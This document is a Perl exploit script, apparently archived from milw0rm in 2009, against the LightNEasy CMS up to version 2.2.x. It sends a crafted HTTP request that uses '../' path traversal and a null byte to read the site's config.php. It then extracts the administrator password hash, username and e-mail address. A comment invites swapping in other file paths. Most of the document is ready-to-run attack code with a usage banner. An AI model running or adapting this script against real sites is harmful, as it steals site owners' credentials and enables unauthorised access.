<html><head><title>LightNEasy sql/no-db <= 2.2.x system Config Disclosure Exploit</title></head><pre>#!/usr/bin/perl
#
# LightNEasy sql/no-db &lt;= 2.2.x system config disclosure exploit
# 
# by staker
# ------------------------------
# mail: staker[at]hotmail[dot]it
# url: http://www.lightneasy.org
# ------------------------------
#  
# it works with magic_quotes_gpc=off
# 
# short explanation:
# 
# -----------------------------------------------------
# LightNEasy contains one flaw that allows an attacker 
# to disclose a local file because of file_get_contents
# it's possible to retrieve the configuration file
# passing as argument '../data/config.php'. Example:
# http://[host]/LightNEasy.php?page=../data/config.php
# ----------------------------------------------------
# Today is: 09 June 2009 
# Location: Italy,Turin.
# http://www.youtube.com/watch?v=uXN0pE2Hdt8
# ----------------------------------------------------

use IO::Socket;


my $domain = $ARGV[0] || &amp;usage;


launch_cmd(&quot;../data/config.php&quot;); # if you wanna disclose another file,change it


sub launch_cmd()
{
      my ($data,$result,$html);
      
      my $page = $_[0] || die $!;
      my $path = socket_url($domain,'path');   
      my $host = socket_url($domain,'host');
      
      my $TCP = IO::Socket::INET-&gt;new( 
                                       PeerAddr =&gt; $host,
                                       PeerPort =&gt; 80,
                                       Proto    =&gt; 'tcp',
                                     ) || die $!;
                                     
      $data .= &quot;GET /$path/LightNEasy.php?page=$page%00 HTTP/1.1\r\n&quot;;
      $data .= &quot;Host: $host\r\n&quot;;
      $data .= &quot;User-Agent: Lynx (textmode)\r\n&quot;;
      $data .= &quot;Connection: close\r\n\r\n&quot;;
      
      $TCP-&gt;send($data);
      
      while (&lt;$TCP&gt;) {
            $html .= $_;
      }                
      
      if ($html =~ /password']=&quot;([0-9a-f]{40})&quot;/i) {
            $result .= &quot;Password: $1\n&quot;;
      }      
      if ($html =~ /fromname']=&quot;(.+?)&quot;/i) {
            $result .= &quot;Username: $1\n&quot;;
      }      
      if ($html =~ /toemail']=&quot;(.+?)&quot;/i) {
            $result .= &quot;E-Mail: $1\n&quot;;
      }      
                  
      print $result;
}                                    
                                            

sub socket_url()
{
           my ($url,$ext) = @_;
       
           $url =~ s/http:\/\/// if $url =~ /^http:\/\/(.+?)+$/i;
             
           @GLOBALS = split /\//,$url;
       
           if ($ext eq 'host') {
                return $GLOBALS[0];
           }     
           elsif ($ext eq 'path') {
                return $GLOBALS[1];
           }
           else {
                return join('/',@GLOBALS);    
           }
}


sub parse_url
{
        my $string = shift @_ || die($!);
        
        if ($string !~ /^http:\/\/?/i) {
                $string = 'http://'.$string;
        }
        
        return $string;
}    


sub usage()
{
       print  &quot;[*------------------------------------------------------------*]\n&quot;.
              &quot;[* LightNEasy sql/no-db &lt; 2.2.x sys config disclosure exploit *]\n&quot;.
              &quot;[*------------------------------------------------------------*]\n&quot;. 
              &quot;[* Usage: perl light.pl [domain]                              *]\n&quot;.
              &quot;[* [domain] domain -&gt; http://localhost/lightneasy             *]\n&quot;.
              &quot;[*------------------------------------------------------------*]\n&quot;;
      exit;
}   

# milw0rm.com [2009-06-10]</pre></html>